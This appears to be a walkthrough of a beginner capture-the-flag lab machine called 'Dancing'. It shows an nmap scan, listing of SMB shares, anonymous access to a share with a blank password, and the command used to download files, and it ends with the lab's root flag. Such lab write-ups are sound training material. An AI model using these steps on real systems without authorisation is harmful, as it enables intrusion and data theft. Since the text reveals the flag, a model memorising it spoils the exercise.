
Ip: 10.129.49.144

1: What does the 3-letter acronym SMB stand for?

	Server Message Block

2: What port does SMB use to operate at?

	445

3: What is the service name for port 445 that came up in our Nmap scan?

	nmap -sV 10.129.49.144
	Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-15 14:26 EDT
	Nmap scan report for 10.129.49.144
	Host is up (0.23s latency).
	Not shown: 997 closed tcp ports (conn-refused)
	PORT    STATE SERVICE       VERSION
	135/tcp open  msrpc         Microsoft Windows RPC
	139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
	445/tcp open  microsoft-ds?
	Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
	
	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 31.04 seconds

	microsoft-ds?

4: What is the 'flag' or 'switch' we can use with the SMB tool to 'list' the contents of the share?

	With smb -h we can find the flag to list
	-L

5: How many shares are there on Dancing?

	smbclient -L 10.129.49.144
	Password for [WORKGROUP\kali]:
	
	        Sharename       Type      Comment
	        ---------       ----      -------
	        ADMIN$          Disk      Remote Admin
	        C$              Disk      Default share
	        IPC$            IPC       Remote IPC
	        WorkShares      Disk      
	Reconnecting with SMB1 for workgroup listing.
	do_connect: Connection to 10.129.49.144 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
	Unable to connect with SMB1 -- no workgroup available

	4

6: What is the name of the share we are able to access in the end with a blank password?

	Workshares

	smbclient \\\\10.129.49.144\\WorkShares
	Password for [WORKGROUP\kali]:
	Try "help" to get a list of possible commands.
	smb: \> 

7: What is the command we can use within the SMB shell to download the files we find?

	get

8: Submit root flag

	At james profile we have flag.txt we can get this flag:
	5f61c10dffbc77a704d76016a22f1664     
